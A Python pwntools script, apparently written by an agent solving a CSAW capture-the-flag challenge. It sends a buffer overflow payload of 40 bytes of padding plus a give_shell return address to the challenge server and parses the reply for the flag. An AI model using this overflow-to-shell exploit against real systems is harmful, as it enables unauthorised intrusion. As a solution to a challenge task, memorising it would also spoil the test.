from pwn import *

# Connect to the remote server
p = remote("pwn.chal.csaw.io", 1437)

# Receive the initial banner
banner = p.recvuntil(b"Do you gets it??")
print("Banner received")

# Create the payload: 40 bytes padding + give_shell address
payload = b"A" * 40 + p64(0x4005b6)

# Send the payload
p.send(payload)

# Try to receive data - don't decode immediately
try:
    data = p.recvall(timeout=2)
    # Look for flag pattern in the data
    if b"flag{" in data:
        # Extract the flag
        start = data.find(b"flag{")
        end = data.find(b"}", start) + 1
        if start != -1 and end != -1:
            flag = data[start:end].decode('ascii')
            print("FLAG FOUND:", flag)
        else:
            print("Flag pattern found but couldn't extract complete flag")
            print("Raw data:", data)
    else:
        print("No flag found in response")
        print("Raw data length:", len(data))
        # Try to decode with error handling
        try:
            print("Decoded data:", data.decode('ascii', errors='ignore'))
        except:
            print("Could not decode data")
except Exception as e:
    print("Error receiving data:", e)

p.close()
end_of_edit

